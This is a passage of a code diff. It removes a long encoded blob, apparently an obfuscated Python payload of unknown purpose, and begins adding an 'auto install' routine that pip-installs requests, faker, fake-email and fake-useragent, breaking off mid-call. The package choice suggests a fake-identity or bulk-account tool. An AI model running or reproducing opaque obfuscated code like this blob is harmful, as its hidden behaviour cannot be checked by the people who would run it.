-"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"
-"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"
-))))
+# ------------------[ AUTO INSTALL ]-------------------#
+import os, sys, subprocess, time
+
+
+def auto_install():
+    pkgs = [
+        "requests",
+        "beautifulsoup4",
+        "faker",
+        "fake-email",
+        "fake-useragent",
+    ]
+    total = len(pkgs)
+    os.system("clear")
+    print("\033[1;34m─────────────────────────────────────────────────────\033[1;37m")
+    print("INSTALLING MODULES...")
+    print("\033[1;34m─────────────────────────────────────────────────────\033[1;32m")
+    for i, pkg in enumerate(pkgs, 1):
+        pct = int((i / total) * 100)
+        bar_len = 20
+        filled = int(bar_len * i / total)
+        bar = "█" * filled + "░" * (bar_len - filled)
+        sys.stdout.write(
+            f"\r\033[1;37m[{bar}] \033[1;33m{pct}%\033[1;32m - Installing {pkg}...    "
+        )
+        sys.stdout.flush()
+        subprocess.check_call(
+            [
